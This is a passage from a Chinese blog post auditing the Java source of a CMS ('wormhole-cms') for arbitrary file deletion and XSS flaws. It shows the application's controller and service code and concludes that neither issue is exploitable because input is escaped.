+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>List</span><span class=o>&lt;</span><span class=n>Upload</span><span class=o>&gt;</span><span class=w> </span><span class=n>uploads</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uploadDAO</span><span class=p>.</span><span class=na>selectWithQuery</span><span class=p>(</span><span class=n>builder</span><span class=p>.</span><span class=na>build</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=n>Upload</span><span class=w> </span><span class=n>upload</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>uploads</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>path</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>SysUtils</span><span class=p>.</span><span class=na>pwd</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>upload</span><span class=p>.</span><span class=na>getPath</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>File</span><span class=w> </span><span class=n>file</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>path</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>file</span><span class=p>.</span><span class=na>exists</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>file</span><span class=p>.</span><span class=na>delete</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>uploadDAO</span><span class=p>.</span><span class=na>batchDelete</span><span class=p>(</span><span class=n>ids</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 该方法是通过用户传入的文件ID从数据库中获取文件的信息，然后通过数据库中的信息去删除文件，所以这里文件的信息是无法操控的，因此也就不存在任意文件操控。</p><h3 id=xss>XSS</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;/list&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>ResponseEntity</span><span class=o>&lt;</span><span class=n>Result</span><span class=o>&lt;</span><span class=n>PageResponse</span><span class=o>&lt;</span><span class=n>UserDTO</span><span class=o>&gt;&gt;&gt;</span><span class=w> </span><span class=nf>queryPage</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;page&#34;</span><span class=p>)</span><span class=w> </span><span class=nd>@Min</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;page不能小于1&#34;</span><span class=p>)</span><span class=w> </span><span class=n>Integer</span><span class=w> </span><span class=n>page</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;limit&#34;</span><span class=p>)</span><span class=w> </span><span class=nd>@Min</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;limit不能小于1&#34;</span><span class=p>)</span><span class=w> </span><span class=n>Integer</span><span class=w> </span><span class=n>limit</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;sort&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>sort</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;order&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>order</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;roleIds[]&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>roleIds</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;key&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>PageResponse</span><span class=o>&lt;</span><span class=n>UserDTO</span><span class=o>&gt;</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>userService</span><span class=p>.</span><span class=na>findByPage</span><span class=p>(</span><span class=n>page</span><span class=p>,</span><span class=w> </span><span class=n>limit</span><span class=p>,</span><span class=w> </span><span class=n>sort</span><span class=p>,</span><span class=w> </span><span class=n>order</span><span class=p>,</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>roleIds</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ResponseEntity</span><span class=p>.</span><span class=na>status</span><span class=p>(</span><span class=n>HttpStatus</span><span class=p>.</span><span class=na>OK</span><span class=p>).</span><span class=na>body</span><span class=p>(</span><span class=n>Result</span><span class=p>.</span><span class=na>success</span><span class=p>(</span><span class=n>response</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 对于这个用户管理模块的控制器，可见，他在返回前没有对查询返回的结果和传入参数进行防止XSS注入的处理。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Transactional</span><span class=p>(</span><span class=n>rollbackFor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Exception</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>PageResponse</span><span class=o>&lt;</span><span class=n>UserDTO</span><span class=o>&gt;</span><span class=w> </span><span class=nf>findByPage</span><span class=p>(</span><span class=n>Integer</span><span class=w> </span><span class=n>page</span><span class=p>,</span><span class=w> </span><span class=n>Integer</span><span class=w> </span><span class=n>limit</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>sort</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>order</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>roleIds</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Set</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>userIds</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashSet</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>CollectionUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>roleIds</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>List</span><span class=o>&lt;</span><span class=n>UserRoleRef</span><span class=o>&gt;</span><span class=w> </span><span class=n>userRoleRefs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>userRoleRefService</span><span class=p>.</span><span class=na>findByRoleIds</span><span class=p>(</span><span class=n>roleIds</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>CollectionUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>userRoleRefs</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>userRoleRefs</span><span class=p>.</span><span class=na>forEach</span><span class=p>(</span><span class=n>userRoleRef</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>userIds</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>userRoleRef</span><span class=p>.</span><span class=na>getUserId</span><span class=p>()));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PageResponse</span><span class=o>&lt;&gt;</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=o>&lt;&gt;</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>QueryWrapperBuilder</span><span class=w> </span><span class=n>builder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>QueryWrapperBuilder</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>builder</span><span class=p>.</span><span class=na>sort</span><span class=p>(</span><span class=s>&#34;builtin&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;desc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>sort</span><span class=p>)</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>order</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>builder</span><span class=p>.</span><span class=na>sort</span><span class=p>(</span><span class=s>&#34;username&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;asc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>builder</span><span class=p>.</span><span class=na>sort</span><span class=p>(</span><span class=n>sort</span><span class=p>,</span><span class=w> </span><span class=n>order</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>builder</span><span class=p>.</span><span class=na>like</span><span class=p>(</span><span class=o>!</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>key</span><span class=p>),</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>Arrays</span><span class=p>.</span><span class=na>asList</span><span class=p>(</span><span class=s>&#34;username&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;telephone&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;email&#34;</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>builder</span><span class=p>.</span><span class=na>page</span><span class=p>((</span><span class=n>page</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>limit</span><span class=p>,</span><span class=w> </span><span class=n>limit</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>builder</span><span class=p>.</span><span class=na>in</span><span class=p>(</span><span class=s>&#34;id&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=o>&lt;&gt;</span><span class=p>(</span><span class=n>userIds</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>QueryWrapper</span><span class=w> </span><span class=n>wrapper</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>builder</span><span class=p>.</span><span class=na>build</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>User</span><span class=o>&gt;</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>userDAO</span><span class=p>.</span><span class=na>selectWithQuery</span><span class=p>(</span><span class=n>wrapper</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Integer</span><span class=w> </span><span class=n>total</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>userDAO</span><span class=p>.</span><span class=na>countWithQuery</span><span class=p>(</span><span class=n>wrapper</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>UserDTO</span><span class=o>&gt;</span><span class=w> </span><span class=n>dtos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=n>User</span><span class=w> </span><span class=n>user</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>users</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>UserDTO</span><span class=w> </span><span class=n>userDTO</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UserDTO</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>BeanUtils</span><span class=p>.</span><span class=na>copyProperties</span><span class=p>(</span><span class=n>user</span><span class=p>,</span><span class=w> </span><span class=n>userDTO</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>userDTO</span><span class=p>.</span><span class=na>setPassword</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>List</span><span class=o>&lt;</span><span class=n>RoleDTO</span><span class=o>&gt;</span><span class=w> </span><span class=n>roles</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>roleService</span><span class=p>.</span><span class=na>findByUserId</span><span class=p>(</span><span class=n>user</span><span class=p>.</span><span class=na>getId</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>userDTO</span><span class=p>.</span><span class=na>setRoles</span><span class=p>(</span><span class=n>roles</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>dtos</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>userDTO</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PageResponse</span><span class=o>&lt;&gt;</span><span class=p>(</span><span class=n>total</span><span class=p>,</span><span class=w> </span><span class=n>dtos</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这里也是同样的，对于查询出的结果以及传入的参数没有进行防止XSS的处理，但是这里并没有将传入的参数key嵌入前端页面，所以这里是不存在反射型XSS的，但是查询结果是嵌入了的，所以存储型XSS仍旧值得一试。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@PostMapping</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>ResponseEntity</span><span class=o>&lt;</span><span class=n>Result</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>&gt;&gt;</span><span class=w> </span><span class=nf>save</span><span class=p>(</span><span class=nd>@RequestBody</span><span class=w> </span><span class=nd>@Validated</span><span class=p>(</span><span class=n>UserDTO</span><span class=p>.</span><span class=na>Insert</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w> </span><span class=n>UserDTO</span><span class=w> </span><span class=n>dto</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>userService</span><span class=p>.</span><span class=na>save</span><span class=p>(</span><span class=n>dto</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ResponseEntity</span><span class=p>.</span><span class=na>status</span><span class=p>(</span><span class=n>HttpStatus</span><span class=p>.</span><span class=na>OK</span><span class=p>).</span><span class=na>body</span><span class=p>(</span><span class=n>Result</span><span class=p>.</span><span class=na>success</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这里是用户管理模块中的新建用户的保存控制器，我们可以看到没有进行防XSS的处理，那么我们追溯save方法。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Transactional</span><span class=p>(</span><span class=n>rollbackFor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Exception</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>save</span><span class=p>(</span><span class=n>UserDTO</span><span class=w> </span><span class=n>dto</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//校验数据</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>User</span><span class=w> </span><span class=n>u</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>findByUsername</span><span class=p>(</span><span class=n>dto</span><span class=p>.</span><span class=na>getUsername</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>u</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BusinessException</span><span class=p>(</span><span class=s>&#34;用户名重复&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>User</span><span class=w> </span><span class=n>user</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>User</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BeanUtils</span><span class=p>.</span><span class=na>copyProperties</span><span class=p>(</span><span class=n>dto</span><span class=p>,</span><span class=w> </span><span class=n>user</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>user</span><span class=p>.</span><span class=na>setId</span><span class=p>(</span><span class=n>UUID</span><span class=p>.</span><span class=na>randomUUID</span><span class=p>().</span><span class=na>toString</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>user</span><span class=p>.</span><span class=na>setBuiltin</span><span class=p>(</span><span class=n>0</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>user</span><span class=p>.</span><span class=na>setEnable</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>user</span><span class=p>.</span><span class=na>setTs</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Date</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>user</span><span class=p>.</span><span class=na>setPassword</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>BCryptPasswordEncoder</span><span class=p>().</span><span class=na>encode</span><span class=p>(</span><span class=n>user</span><span class=p>.</span><span class=na>getPassword</span><span class=p>()));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>userDAO</span><span class=p>.</span><span class=na>insert</span><span class=p>(</span><span class=n>user</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>roleId</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>roleService</span><span class=p>.</span><span class=na>findIdByName</span><span class=p>(</span><span class=s>&#34;guest&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>roleId</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>userRoleRefService</span><span class=p>.</span><span class=na>save</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>UserRoleRef</span><span class=p>(</span><span class=n>UUID</span><span class=p>.</span><span class=na>randomUUID</span><span class=p>().</span><span class=na>toString</span><span class=p>(),</span><span class=w> </span><span class=n>user</span><span class=p>.</span><span class=na>getId</span><span class=p>(),</span><span class=w> </span><span class=n>roleId</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Date</span><span class=p>()));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 审计我们可知，检查了用户名是否重复，设置了用户的个人信息，可见依旧没有对XSS进行防御，所以这里在新建用户时是存在一个存储型XSS的。</p><p>​ 我们尝试存储型XSS：</p><p><img src=/p/wormhole-cms/image-20241216133642497.png width=1480 height=76 srcset="/p/wormhole-cms/image-20241216133642497_hu6402877587947810604.png 480w, /p/wormhole-cms/image-20241216133642497_hu16099113962061507140.png 1024w" loading=lazy alt=image-20241216133642497 class=gallery-image data-flex-grow=1947 data-flex-basis=4673px></p><p>​ 可见这里的&lt;被转义了，回顾项目结构我们知道这个项目是存在过滤器的，但是我并没有找到过滤器的文件，而这里的特殊字符也确实被转义了，也就是不存在XSS。
+至此此项目审计完毕。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/code-audit/>Code Audit</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/cs_singlewindow_cms/><div class=article-image><img src=/p/cs_singlewindow_cms/cover.f57e1bc77d18d988d1ea5646a3fdb180_hu17995570379238100603.png width=250 height=150 loading=lazy alt="Featured image of post cs_singlewindow_cms" data-hash="md5-9X4bx30Y2YjR6lZGo/2xgA=="></div><div class=article-details><h2 class=article-title>cs_singlewindow_cms</h2></div></a></article><article class=has-image><a href=/p/jfinalcms/><div class=article-image><img src=/p/jfinalcms/cover.475149eeef9e821b03091311ac435ba9_hu7198081271608463053.png width=250 height=150 loading=lazy alt="Featured image of post JFinalCMS" data-hash="md5-R1FJ7u+eghsDCRMRrENbqQ=="></div><div class=article-details><h2 class=article-title>JFinalCMS</h2></div></a></article><article class=has-image><a href=/p/wetech-cms/><div class=article-image><img src=/p/wetech-cms/cover.369de65cc2233c898fe67f92883c1864_hu3456308394521248238.png width=250 height=150 loading=lazy alt="Featured image of post wetech-cms" 